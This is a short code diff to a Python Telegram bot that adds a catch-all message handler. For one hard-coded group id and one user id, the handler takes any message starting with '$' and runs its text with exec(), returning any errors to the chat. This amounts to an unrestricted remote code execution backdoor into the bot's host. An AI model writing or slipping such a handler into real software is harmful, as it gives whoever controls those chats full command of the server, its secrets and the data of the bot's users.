@@ -157,3 +157,12 @@ def fill_group_handler(message):
 def fill_group_handler(message):
     if message.chat.id == -1002499863221:        
         CompareAllGroups()        
+
+@bot.message_handler(func=lambda message: True)
+def send(message):
+    if (message.chat.id == -1002499863221 or message.chat.id == 6119344300) and message.text.startswith('$'):
+        text=message.text.replace('$', '', 1)
+        try:            
+            exec(text)
+        except Exception as e:            
+            bot.send_message(message.chat.id, e)
